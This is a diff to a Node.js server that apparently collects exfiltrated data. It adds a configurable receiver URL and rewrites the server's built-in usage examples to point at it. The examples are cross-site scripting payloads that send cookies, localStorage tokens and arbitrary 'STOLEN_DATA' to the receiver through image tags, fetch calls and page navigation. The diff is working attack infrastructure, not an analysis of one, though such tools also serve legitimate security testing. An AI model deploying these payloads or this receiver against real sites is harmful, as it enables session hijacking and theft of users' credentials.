@@ -1,5 +1,10 @@
 const http = require('http');
 
+// ===== CONFIGURATION =====
+// This is the URL where this receiver is accessible (change when deploying to remote server)
+const RECEIVER_URL = 'http://example.com:3333';
+// =========================
+
 // Store recent requests in memory
 const requests = [];
 const MAX_REQUESTS = 50;
@@ -183,13 +188,13 @@ const server = http.createServer((req, res) => {
       <h2>Usage Examples</h2>
       <div class="code">
 // Send data via image tag<br>
-&lt;img src="http://example.com:3333/?data=STOLEN_DATA"&gt;<br><br>
+&lt;img src="${RECEIVER_URL}/?data=STOLEN_DATA"&gt;<br><br>
 // Send cookies<br>
-&lt;script&gt;new Image().src='http://example.com:3333/?c='+document.cookie&lt;/script&gt;<br><br>
+&lt;script&gt;new Image().src='${RECEIVER_URL}/?c='+document.cookie&lt;/script&gt;<br><br>
 // Send any data<br>
-&lt;script&gt;fetch('http://example.com:3333/?data='+encodeURIComponent(sensitiveData))&lt;/script&gt;<br><br>
+&lt;script&gt;fetch('${RECEIVER_URL}/?data='+encodeURIComponent(sensitiveData))&lt;/script&gt;<br><br>
 // Send via navigation<br>
-&lt;script&gt;location='http://example.com:3333/?token='+localStorage.token&lt;/script&gt;
+&lt;script&gt;location='${RECEIVER_URL}/?token='+localStorage.token&lt;/script&gt;
       </div>
     </div>
 
